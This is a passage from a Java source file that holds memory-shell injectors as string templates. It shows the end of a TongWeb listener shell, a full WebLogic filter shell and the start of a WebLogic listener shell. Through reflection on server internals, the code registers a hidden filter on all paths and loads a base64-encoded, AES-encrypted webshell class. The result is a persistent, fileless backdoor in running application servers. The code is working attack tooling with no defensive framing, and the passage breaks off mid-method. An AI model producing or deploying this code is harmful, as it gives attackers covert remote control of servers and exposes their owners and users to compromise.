                "                Method defineClass1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
                "                defineClass1.setAccessible(true);\n" +
                "                Class listenerClass = (Class) defineClass1.invoke(Thread.currentThread().getContextClassLoader(), ListenerClass, 0, ListenerClass.length);\n" +
                "                MEMSHELL_OBJECT = listenerClass.newInstance();\n" +
                "            } catch (Exception var4) {\n" +
                "            }\n" +
                "        }\n" +
                "\n" +
                "    }\n" +
                "    public static byte[] base64Decode(String bs) throws Exception {\n" +
                "        byte[] value = null;\n" +
                "\n" +
                "        Class base64;\n" +
                "        try {\n" +
                "            base64 = Class.forName(\"java.util.Base64\");\n" +
                "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
                "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
                "        } catch (Exception var6) {\n" +
                "            try {\n" +
                "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
                "                Object decoder = base64.newInstance();\n" +
                "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
                "            } catch (Exception var5) {\n" +
                "            }\n" +
                "        }\n" +
                "\n" +
                "        return value;\n" +
                "    }\n" +
                "    static {\n" +
                "        new TongWebListenerMemShell();\n" +
                "    }\n" +
                "}\n";

    public static final String WeblogicFilterMemShell =
            "import java.lang.reflect.Field;\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.util.*;\n" +
            "\n" +
            "public class WeblogicFilterMemShell{\n" +
            "    private static String filterName;\n" +
            "    private static String className = \"memshell.WeblogicFilterShell\";\n" +
            "\n" +
            "    public WeblogicFilterMemShell() {\n" +
            "        filterName = \"WeblogicFilterShell\";\n" +
            "        injectM();\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void injectM() {\n" +
            "        List var0 = getContext();\n" +
            "        Iterator var1 = var0.iterator();\n" +
            "        IMC();\n" +
            "        while(var1.hasNext()) {\n" +
            "            Object var2 = var1.next();\n" +
            "            IMF(var2);\n" +
            "        }\n" +
            "    }\n" +
            "    public static synchronized void IMF(Object var0) {\n" +
            "        try {\n" +
            "            Field var1 = var0.getClass().getDeclaredField(\"filterManager\");\n" +
            "            var1.setAccessible(true);\n" +
            "//            FilterManager var2 = (FilterManager) var1.get(var0);\n" +
            "            Object var2 =  var1.get(var0);\n" +
            "\n" +
            "            Method var3;\n" +
            "            try {\n" +
            "                var3 = var2.getClass().getDeclaredMethod(\"registerFilter\", String.class, String.class, String[].class, String[].class, Map.class);\n" +
            "                var3.setAccessible(true);\n" +
            "                var3.invoke(var2, filterName, className, new String[]{\"/*\"}, new String[0], new HashMap());\n" +
            "            } catch (Exception var8) {\n" +
            "                var3 = var2.getClass().getDeclaredMethod(\"registerFilter\", String.class, String.class, String[].class, String[].class, Map.class, String[].class);\n" +
            "                var3.setAccessible(true);\n" +
            "                var3.invoke(var2, filterName, className, new String[]{\"/*\"}, new String[0], new HashMap(), new String[0]);\n" +
            "            }\n" +
            "\n" +
            "            Field var4 = var2.getClass().getDeclaredField(\"filters\");\n" +
            "            var4.setAccessible(true);\n" +
            "            HashMap var5 = (HashMap) var4.get(var2);\n" +
            "//            FilterWrapper var6 = (FilterWrapper) var5.get(filterName);\n" +
            "            Object var6 = var5.get(filterName);\n" +
            "            Method var7 = var6.getClass().getDeclaredMethod(\"setHeadFilter\", Boolean.TYPE);\n" +
            "            var7.setAccessible(true);\n" +
            "            var7.invoke(var6, true);\n" +
            "\n" +
            "        } catch (Throwable var9) {\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized List<Object> getContext() {\n" +
            "        ArrayList var0 = new ArrayList();\n" +
            "\n" +
            "        try {\n" +
            "            Method var1 = Thread.class.getDeclaredMethod(\"getThreads\", (Class[])null);\n" +
            "            var1.setAccessible(true);\n" +
            "            Thread[] var2 = (Thread[])((Thread[])var1.invoke((Object)null));\n" +
            "            Thread[] var3 = var2;\n" +
            "            int var4 = var2.length;\n" +
            "\n" +
            "            for(int var5 = 0; var5 < var4; ++var5) {\n" +
            "                Thread var6 = var3[var5];\n" +
            "                if (var6.getClass().getName().contains(\"weblogic.timers.internal.TimerThread\")) {\n" +
            "                    try {\n" +
            "                        Object var7 = getFV(var6, \"timerThread\");\n" +
            "\n" +
            "                        Object var12;\n" +
            "                        Object var13;\n" +
            "                        Object var15;\n" +
            "                        Object var17;\n" +
            "                        try {\n" +
            "                            Object var8 = getFV(var7, \"timerTree\");\n" +
            "                            Map var21 = (Map)var8;\n" +
            "                            Iterator var22 = var21.entrySet().iterator();\n" +
            "\n" +
            "                            while(var22.hasNext()) {\n" +
            "                                Map.Entry var23 = (Map.Entry)var22.next();\n" +
            "                                var12 = var23.getValue();\n" +
            "                                var13 = getFV(var12, \"listener\");\n" +
            "                                if (var13.getClass().getName().contains(\"SessionContext\")) {\n" +
            "                                    Field var24 = var13.getClass().getDeclaredField(\"this$0\");\n" +
            "                                    var24.setAccessible(true);\n" +
            "                                    var15 = var24.get(var13);\n" +
            "                                    Field var25 = var15.getClass().getSuperclass().getDeclaredField(\"servletContext\");\n" +
            "                                    var25.setAccessible(true);\n" +
            "                                    var17 = var25.get(var15);\n" +
            "                                    var0.add(var17);\n" +
            "                                }\n" +
            "                            }\n" +
            "                        } catch (Exception var18) {\n" +
            "                            Object var9 = getFV(var7, \"managerList\");\n" +
            "                            List var10 = (List)var9;\n" +
            "                            Iterator var11 = var10.iterator();\n" +
            "\n" +
            "                            while(var11.hasNext()) {\n" +
            "                                var12 = var11.next();\n" +
            "                                if (var12.toString().contains(\"AsyncContextTimer-ContextPath=\")) {\n" +
            "                                    var13 = getFV(var12, \"timerSet\");\n" +
            "                                    Object var14 = getFV(var13, \"timers\");\n" +
            "                                    var15 = ((List)var14).get(0);\n" +
            "                                    Object var16 = getFV(var15, \"listener\");\n" +
            "                                    var17 = getFV(var16, \"context\");\n" +
            "                                    var0.add(var17);\n" +
            "                                }\n" +
            "                            }\n" +
            "                        }\n" +
            "                    } catch (Exception var19) {\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "        } catch (Exception var20) {\n" +
            "        }\n" +
            "\n" +
            "        return var0;\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void IMC() {\n" +
            "\n" +
            "        try {\n" +
            "            Thread.currentThread().getContextClassLoader().loadClass(\"memshell.WeblogicFilterShell\");\n" +
            "        } catch (Exception var4) {\n" +
            "            try {\n" +
            "                Method var1 = ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, Integer.TYPE, Integer.TYPE);\n" +
            "                var1.setAccessible(true);\n" +
            "                byte[] var2 =base64Decode(\"yv66vgAAADMBRgoAWgCrCQBFAKwJAEUArQgArgkARQCvCACwCQBFALEIALIJAEUAswcAtAoACgCrCgAKALUKAAoAtgoARQC3CQBFALgIALkJAEUAugoAWgC7CgBaALwIAL0KAL4AvwcAwAoAMQDBCgAWAMIKAL4AwwoAvgDEBwDFCADGCgDHAMgKADEAyQoAxwDKBwDLCgDHAMwKACAAzQoAIADOCgAxAM8IANAKAC4A0QgA0gcA0woALgDUBwDVCgDWANcKADAA2AgA2QcA2gcAcwcA2wcA3AgA3QoALgDeCADfCADgCADhCADiCADjBwDkBwDlCADmCwA5AOcIAOgKADEA6QsAOQDqCwA5AOsKAEUA7AoARQDtCADuCwDvAPAHAPEKAC4A8goARQC7CgBFAPMLAO8A9AgA9QsAOQD0BwD2CgBMAKsKADAA9wsAOgD4CgAxAPkKAPoA+woAMAC2CgBMAPwKAEUA/QoAMQD+CAD/CAEACwEBAQIKABsBAwcBBAcBBQEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAJ4YwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAA1B3ZAEABHBhdGgBAANtZDUBAAJjcwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAeTG1lbXNoZWxsL1dlYmxvZ2ljRmlsdGVyU2hlbGw7AQAaKExqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAAF6AQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAFRAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQACY2IBAAJbQgEAAXgBAAcoW0JaKVtCAQABYwEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEABHZhcjQBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAFzAQABbQEAAVoBAA1TdGFja01hcFRhYmxlBwDxBwEGBwDFAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAcA3AEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAR2YXI2AQACYnMBAAV2YWx1ZQEACkV4Y2VwdGlvbnMBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZGVjb2RlcgEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwcBBwEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAFmAQAHc2Vzc2lvbgEAIExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAEZGF0YQEABHZhcjkBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwcBCAcBCQEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAYV2VibG9naWNGaWx0ZXJTaGVsbC5qYXZhDABmAGcMAFwAXQwAXgBfAQAQM2M2ZTBiOGE5YzE1MjI0YQwAYABhAQAEcEFTMwwAYgBhAQAQL2Zhdmljb25kZW1vLmljbwwAYwBhAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAQoBCwwBDAENDABkAIEMAGQAYQEABVVURi04DABlAGEMAGYAbQwBDgEPAQADQUVTBwEGDAEQAREBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDAESARMMAGYBFAwAkgEVDAEWARcBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQADTUQ1BwEYDAEQARkMARoBGwwBHAEdAQAUamF2YS9tYXRoL0JpZ0ludGVnZXIMAR4BEwwAZgEfDAEMASAMASEBDQEAEGphdmEudXRpbC5CYXNlNjQMASIBIwEACmdldEVuY29kZXIBABJbTGphdmEvbGFuZy9DbGFzczsMASQBJQEAE1tMamF2YS9sYW5nL09iamVjdDsHASYMAScBKAwBKQEqAQAOZW5jb2RlVG9TdHJpbmcBAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAFnN1bi5taXNjLkJBU0U2NEVuY29kZXIMASsBLAEABmVuY29kZQEACmdldERlY29kZXIBAAZkZWNvZGUBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAQWC1SZXF1ZXN0ZWQtV2l0aAwBLQCBAQAOWE1MSFRUUFJlcXVlc3QMAS4BLwwBMAExDAEyAIEMAI8AkAwAdAB1AQAQbWVtc2hlbGwucGF5bG9hZAcBCAwBMwE0AQAcbWVtc2hlbGwvV2VibG9naWNGaWx0ZXJTaGVsbAwBNQE2DABwAHEMATcBOAEACnBhcmFtZXRlcnMBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwBOQE6DAE7ATwMAT0BPgcBPwwBQAFBDAFCARMMAIUAhgwBPQEgAQAOWG1sSFRUUFJlcXVlc3QBAAdTdWNjZXNzBwFDDACXAUQMAUUAZwEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEAFGphdmF4L3NlcnZsZXQvRmlsdGVyAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQALZGVmaW5lQ2xhc3MBABcoW0JJSSlMamF2YS9sYW5nL0NsYXNzOwEAC2dldEluc3RhbmNlAQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAhnZXRCeXRlcwEABCgpW0IBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAHZG9GaW5hbAEABihbQilbQgEAG2phdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdAEAMShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAZsZW5ndGgBAAMoKUkBAAZ1cGRhdGUBAAcoW0JJSSlWAQAGZGlnZXN0AQAGKElbQilWAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0SGVhZGVyAQAHaW5kZXhPZgEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAMZ2V0UGFyYW1ldGVyAQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAxzZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEACXN1YnN0cmluZwEAFihJSSlMamF2YS9sYW5nL1N0cmluZzsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAFd3JpdGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAt0b0J5dGVBcnJheQEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4BAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQAPcHJpbnRTdGFja1RyYWNlACEARQBaAAEAWwAHAAEAXABdAAAAAQBeAF8AAAAAAGAAYQAAAAEAYgBhAAAAAQBjAGEAAAAAAGQAYQAAAAEAZQBhAAAACgABAGYAZwABAGgAAACQAAMAAQAAAEYqtwABKgG1AAIqAbUAAyoSBLUABSoSBrUAByoSCLUACSq7AApZtwALKrQAB7YADCq0AAW2AAy2AA24AA61AA8qEhC1ABGxAAAAAgBpAAAAJgAJAAAAGAAEABAACQARAA4AEgAUABMAGgAUACAAGQA/ABoARQAbAGoAAAAMAAEAAABGAGsAbAAAAAEAZgBtAAEAaAAAAJsAAwACAAAARyortwASKgG1AAIqAbUAAyoSBLUABSoSBrUAByoSCLUACSq7AApZtwALKrQAB7YADCq0AAW2AAy2AA24AA61AA8qEhC1ABGxAAAAAgBpAAAAJgAJAAAAHwAFABAACgARAA8AEgAVABMAGwAUACEAIABAACEARgAiAGoAAAAWAAIAAABHAGsAbAAAAAAARwBuAG8AAQABAHAAcQABAGgAAAA9AAQAAgAAAAkqKwMrvrcAE7AAAAACAGkAAAAGAAEAAAAlAGoAAAAWAAIAAAAJAGsAbAAAAAAACQByAHMAAQABAHQAdQABAGgAAADYAAYABAAAACwSFLgAFU4tHJkABwSnAAQFuwAWWSq0AAW2ABcSFLcAGLYAGS0rtgAasE4BsAABAAAAKAApABsAAwBpAAAAFgAFAAAAKgAGACsAIwAsACkALQAqAC4AagAAADQABQAGACMAdgB3AAMAKgACAHgAeQADAAAALABrAGwAAAAAACwAegBzAAEAAAAsAHsAfAACAH0AAAA8AAP/AA8ABAcAfgcALwEHAH8AAQcAf/8AAAAEBwB+BwAvAQcAfwACBwB/Af8AGAADBwB+BwAvAQABBwCAAAkAZACBAAEAaAAAAKcABAADAAAAMAFMEhy4AB1NLCq2ABcDKrYAHrYAH7sAIFkELLYAIbcAIhAQtgAjtgAkTKcABE0rsAABAAIAKgAtABsAAwBpAAAAHgAHAAAAMwACADYACAA3ABUAOAAqADoALQA5AC4APABqAAAAIAADAAgAIgB7AIIAAgAAADAAegBhAAAAAgAuAIMAYQABAH0AAAATAAL/AC0AAgcAhAcAhAABBwCAAAAJAIUAhgACAGgAAAFJAAYABQAAAHgBTBIluAAmTSwSJwHAACi2ACksAcAAKrYAK04ttgAsEi0EvQAuWQMSL1O2ACktBL0AMFkDKlO2ACvAADFMpwA5ThIyuAAmTSy2ADM6BBkEtgAsEjQEvQAuWQMSL1O2ACkZBAS9ADBZAypTtgArwAAxTKcABToEK7AAAgACAD0AQAAbAEEAcQB0ABsAAwBpAAAAMgAMAAAAQAACAEQACABFABsARgA9AE4AQABHAEEASQBHAEoATQBLAHEATQB0AEwAdgBQAGoAAABIAAcAGwAiAIcAiAADAAgAOACJAIoAAgBNACQAhwCIAAQARwAtAIkAigACAEEANQCLAHkAAwAAAHgAjABzAAAAAgB2AI0AYQABAH0AAAApAAP/AEAAAgcALwcAhAABBwCA/wAzAAQHAC8HAIQABwCAAAEHAID5AAEAjgAAAAQAAQAbAAkAjwCQAAIAaAAAAVUABgAFAAAAhAFMEiW4ACZNLBI1AcAAKLYAKSwBwAAqtgArTi22ACwSNgS9AC5ZAxIxU7YAKS0EvQAwWQMqU7YAK8AAL8AAL8AAL0ynAD9OEje4ACZNLLYAMzoEGQS2ACwSOAS9AC5ZAxIxU7YAKRkEBL0AMFkDKlO2ACvAAC/AAC/AAC9MpwAFOgQrsAACAAIAQwBGABsARwB9AIAAGwADAGkAAAAyAAwAAABUAAIAWAAIAFkAGwBaAEMAYgBGAFsARwBdAE0AXgBTAF8AfQBhAIAAYACCAGQAagAAAEgABwAbACgAkQCIAAMACAA+AIkAigACAFMAKgCRAIgABABNADMAiQCKAAIARwA7AIsAeQADAAAAhACMAGEAAAACAIIAjQBzAAEAfQAAACkAA/8ARgACBwCEBwAvAAEHAID/ADkABAcAhAcALwAHAIAAAQcAgPkAAQCOAAAABAABABsAAQCSAJMAAgBoAAAANQAAAAIAAAABsQAAAAIAaQAAAAYAAQAAAGoAagAAABYAAgAAAAEAawBsAAAAAAABAJQAlQABAI4AAAAEAAEAlgABAJcAmAACAGgAAAJVAAUACAAAAVcqK8AAObUAAioswAA6tQADKrQAAhI7uQA8AgDGAPYqtAACEju5ADwCABI9tgA+Ap8A4iq0AAK5AD8BADoEKrQAAiq0AAe5AEACALgAQToFKhkFA7YAQjoFGQQSQ7kARAIAxwAiGQQSQ7sARVkqtgAstgBGtwBHGQW2AEi5AEkDAKcAjiq0AAISShkFuQBLAwC7AExZtwBNOgYZBBJDuQBEAgDAAC62ADM6BxkHGQa2AE5XGQcZBbYATlcZByq0AAK2AE5XKrQAA7kATwEAKrQADwMQELYAULYAURkHtgBSVyq0AAO5AE8BACoZBrYAUwS2AEK4AFS2AFEqtAADuQBPAQAqtAAPEBC2AFW2AFGnAD4qtAACEju5ADwCAMYAKCq0AAISO7kAPAIAEla2AD4CnwAUKrQAA7kATwEAEle2AFGnAAstKyy5AFgDAKcACjoEGQS2AFmxAAEAAAFMAU8AGwADAGkAAABmABkAAABvAAgAcAAQAHEAMgByAD0AdABPAHUAWAB2AGQAdwCDAHkAkAB6AJkAewCqAHwAsgB9ALoAfgDEAH8A2gCAAOAAgQD5AIIBDgCEATMAhQFEAIcBTACLAU8AiQFRAIoBVgCNAGoAAABcAAkAmQB1AJkAmgAGAKoAZACbAIgABwA9ANEAnACdAAQATwC/AJ4AcwAFAVEABQCfAHkABAAAAVcAawBsAAAAAAFXAKAAoQABAAABVwCiAKMAAgAAAVcApAClAAMAfQAAABYAB/0AgwcApgcAL/kAigIyB0IHAIAGAI4AAAAGAAIApwCWAAEAqABnAAEAaAAAACsAAAABAAAAAbEAAAACAGkAAAAGAAEAAACRAGoAAAAMAAEAAAABAGsAbAAAAAEAqQAAAAIAqg==\");\n" +
            "                var1.invoke(Thread.currentThread().getContextClassLoader(), var2, 0, var2.length);\n" +
            "            } catch (Throwable var3) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "    }\n" +
            "\n" +
            "    private static synchronized Object getFV(Object var0, String var1) throws Exception {\n" +
            "        Field var2 = null;\n" +
            "        Class var3 = var0.getClass();\n" +
            "\n" +
            "        while(var3 != Object.class) {\n" +
            "            try {\n" +
            "                var2 = var3.getDeclaredField(var1);\n" +
            "                break;\n" +
            "            } catch (NoSuchFieldException var5) {\n" +
            "                var3 = var3.getSuperclass();\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        if (var2 == null) {\n" +
            "            throw new NoSuchFieldException(var1);\n" +
            "        } else {\n" +
            "            var2.setAccessible(true);\n" +
            "            return var2.get(var0);\n" +
            "        }\n" +
            "    }\n" +
            "\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        byte[] value = null;\n" +
            "\n" +
            "        Class base64;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", (Class[]) null).invoke(base64, (Object[]) null);\n" +
            "            value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decode\", String.class).invoke(decoder, bs));\n" +
            "        } catch (Exception var6) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) ((byte[]) decoder.getClass().getMethod(\"decodeBuffer\", String.class).invoke(decoder, bs));\n" +
            "            } catch (Exception var5) {\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        return value;\n" +
            "    }\n" +
            "    static {\n" +
            "        new WeblogicFilterMemShell();\n" +
            "    }\n" +
            "}\n";

    public static final String WeblogicListenerMemShell =
            "import java.lang.reflect.Field;\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.util.ArrayList;\n" +
            "import java.util.Iterator;\n" +
            "import java.util.List;\n" +
            "import java.util.Map;\n" +
            "\n" +
            "public class WeblogicListenerMemShell {\n" +
            "    private static String shellClassName = \"memshell.WeblogicListenerShell\";\n" +
            "\n" +
            "    public WeblogicListenerMemShell() {\n" +
            "        injectM();\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void injectM() {\n" +
            "        List var0 = getContext();\n" +
            "        Iterator var1 = var0.iterator();\n" +
            "        while(var1.hasNext()) {\n" +
            "            Object var2 = var1.next();\n" +
            "            if (isInject(var2)){break;}\n" +
            "            registerListener(var2);\n" +
            "        }\n" +
            "    }\n" +
            "    private static synchronized boolean isInject(Object obj){\n" +
            "        boolean flag = false;\n" +
            "        try{\n" +
            "            Field var6 = obj.getClass().getDeclaredField(\"eventsManager\");\n" +
            "            var6.setAccessible(true);\n" +
            "            Object var7 = var6.get(obj);\n" +
            "            Method var3 = var7.getClass().getDeclaredMethod(\"isListenerRegistered\", String.class);\n" +
            "            var3.setAccessible(true);\n" +
            "            flag = ((Boolean)var3.invoke(var7, shellClassName)).booleanValue();\n" +
            "        }catch(Exception e){\n" +
            "            e.printStackTrace();\n" +
            "        }\n" +
            "\n" +
            "        return flag;\n" +
            "    }\n" +
            "\n" +
            "\n" +
            "    public static synchronized List<Object> getContext() {\n" +
            "        ArrayList var0 = new ArrayList();\n" +
            "\n" +
            "        try {\n" +
            "            Method var1 = Thread.class.getDeclaredMethod(\"getThreads\", (Class[])null);\n" +
            "            var1.setAccessible(true);\n" +
            "            Thread[] var2 = (Thread[])((Thread[])var1.invoke((Object)null));\n" +
            "            Thread[] var3 = var2;\n" +
            "            int var4 = var2.length;\n" +
            "\n" +
            "            for(int var5 = 0; var5 < var4; ++var5) {\n" +
            "                Thread var6 = var3[var5];\n" +
            "                if (var6.getClass().getName().contains(\"weblogic.timers.internal.TimerThread\")) {\n" +
            "                    try {\n" +
            "                        Object var7 = getFV(var6, \"timerThread\");\n" +
            "\n" +
            "                        Object var12;\n" +
            "                        Object var13;\n" +
            "                        Object var15;\n" +
            "                        Object var17;\n" +
            "                        try {\n" +
            "                            Object var8 = getFV(var7, \"timerTree\");\n" +
            "                            Map var21 = (Map)var8;\n" +
            "                            Iterator var22 = var21.entrySet().iterator();\n" +
            "\n" +
            "                            while(var22.hasNext()) {\n" +
            "                                Map.Entry var23 = (Map.Entry)var22.next();\n" +
            "                                var12 = var23.getValue();\n" +
            "                                var13 = getFV(var12, \"listener\");\n" +
            "                                if (var13.getClass().getName().contains(\"SessionContext\")) {\n" +
            "                                    Field var24 = var13.getClass().getDeclaredField(\"this$0\");\n" +
            "                                    var24.setAccessible(true);\n" +
            "                                    var15 = var24.get(var13);\n" +
            "                                    Field var25 = var15.getClass().getSuperclass().getDeclaredField(\"servletContext\");\n" +
            "                                    var25.setAccessible(true);\n" +
            "                                    var17 = var25.get(var15);\n" +
            "                                    var0.add(var17);\n" +
            "                                }\n" +
            "                            }\n" +
            "                        } catch (Exception var18) {\n" +
            "                            Object var9 = getFV(var7, \"managerList\");\n" +
            "                            List var10 = (List)var9;\n" +
            "                            Iterator var11 = var10.iterator();\n" +
            "\n" +
            "                            while(var11.hasNext()) {\n" +
            "                                var12 = var11.next();\n" +
            "                                if (var12.toString().contains(\"AsyncContextTimer-ContextPath=\")) {\n" +
            "                                    var13 = getFV(var12, \"timerSet\");\n" +
            "                                    Object var14 = getFV(var13, \"timers\");\n" +
            "                                    var15 = ((List)var14).get(0);\n" +
            "                                    Object var16 = getFV(var15, \"listener\");\n" +
            "                                    var17 = getFV(var16, \"context\");\n" +
            "                                    var0.add(var17);\n" +
            "                                }\n" +
            "                            }\n" +
            "                        }\n" +
            "                    } catch (Exception var19) {\n" +
            "                    }\n" +
            "                }\n" +
            "            }\n" +
            "        } catch (Exception var20) {\n" +
            "        }\n" +
            "\n" +
            "        return var0;\n" +
            "    }\n" +
            "\n" +
            "    public static synchronized void registerListener(Object var0) {\n" +
            "        try {\n" +
